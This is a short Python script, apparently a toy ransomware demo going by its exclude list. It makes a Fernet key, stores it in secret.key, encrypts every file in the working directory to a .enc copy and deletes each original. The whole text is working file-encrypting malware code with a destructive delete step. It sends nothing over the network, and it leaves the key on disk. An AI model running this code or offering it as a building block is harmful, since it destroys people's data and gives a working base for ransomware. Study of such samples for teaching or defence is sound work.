#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

exclude = ["README.md", "License" ,"ransomware.py", "secret.key", "decrypt.py", "encrypt.py"]

# Create key only ONCE
if not os.path.exists("secret.key"):
    key = Fernet.generate_key()
    with open("secret.key", "wb") as kf:
        kf.write(key)
else:
    with open("secret.key", "rb") as kf:
        key = kf.read()

for file in os.listdir():
    if file in exclude:
        continue

    # skip already-encrypted files
    if file.endswith(".enc"):
        continue

    if os.path.isfile(file):
        with open(file, "rb") as f:
            content = f.read()

        encrypted = Fernet(key).encrypt(content)

        # write encrypted data to filename.enc
        new_name = file + ".enc"
        with open(new_name, "wb") as f:
            f.write(encrypted)

        # delete original file
        os.remove(file)

print("Files successfully encrypted (.enc)")
